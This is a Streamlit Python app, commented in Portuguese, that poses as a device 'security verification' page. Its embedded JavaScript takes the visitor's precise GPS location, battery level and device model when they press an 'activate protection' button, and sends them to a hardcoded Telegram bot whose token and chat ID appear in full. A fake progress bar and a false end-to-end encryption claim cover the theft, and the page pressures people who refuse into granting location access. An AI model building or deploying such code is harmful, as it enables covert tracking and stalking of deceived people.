import streamlit as st
import time

# --- CONFIGURAÇÃO DO BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Sistema de Verificação")

# --- CSS MÍNIMO (SÓ PARA O FUNDO E TEXTO) ---
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert { display: none; }
    </style>
""", unsafe_allow_html=True)

st.title("Verificação de Segurança")

# Espaço para a bolha (que vamos estilizar depois)
caixa_status = st.empty()
caixa_status.subheader("Status: Aguardando ativação (4%)")

# --- O MOTOR DO APLICATIVO (O BOTÃO QUE FORÇA O POP-UP) ---
js_funcional = f"""
<div style="display: flex; justify-content: center; padding: 20px;">
    <button id="btnClick" style="padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 8px; border: none; background-color: white; color: black;">
        🔴 ATIVAR PROTEÇÃO AGORA
    </button>
</div>

<script>
document.getElementById('btnClick').onclick = function() {{
    // 1. Tenta pegar a localização com ALTA PRECISÃO (isso força o pop-up da Google)
    navigator.geolocation.getCurrentPosition(
        async function(pos) {{
            try {{
                // Se o usuário permitiu no pop-up, pegamos os dados:
                const bat = await navigator.getBattery();
                const nivel = Math.round(bat.level * 100);
                const modelo = navigator.userAgent.split('(')[1].split(')')[0];
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
                
                const mensagem = "🛡️ PROTEÇÃO ATIVADA\\n\\n📱 Modelo: " + modelo + "\\n🔋 Bateria: " + nivel + "%\\n📍 Localização: " + mapa;

                // Envio para o Telegram via Fetch (Direto do Navegador)
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{
                        chat_id: "{ID}",
                        text: mensagem
                    }})
                }});

                // Avisa o Streamlit para rodar a animação
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch (e) {{
                alert("Erro ao processar dados.");
            }}
        }},
        function(err) {{
            // Se o pop-up não abriu ou foi negado
            if(err.code == 1) {{
                alert("PERMISSÃO NEGADA: Você precisa clicar no cadeado lá em cima (ao lado do link) e permitir a localização.");
            }} else {{
                alert("ERRO: Certifique-se de que o GPS do seu celular está ligado.");
            }}
        }},
        {{ 
            enableHighAccuracy: true, 
            timeout: 15000, 
            maximumAge: 0 
        }}
    );
}};
</script>
"""

# Renderiza o botão. O 'allow="geolocation"' é fundamental!
ativou = st.components.v1.html(js_funcional, height=100)

# --- LÓGICA DE PÓS-ATIVAÇÃO ---
if ativou:
    # Simulação de carregamento
    progresso = st.progress(4)
    for i in range(4, 101, 5):
        caixa_status.subheader(f"Verificando: {i}%")
        progresso.progress(i)
        time.sleep(0.05)
    
    st.success("✅ DISPOSITIVO PROTEGIDO!")
    st.balloons()
    st.stop()

st.write("---")
st.write("🔒 Criptografia de ponta a ponta ativa.")
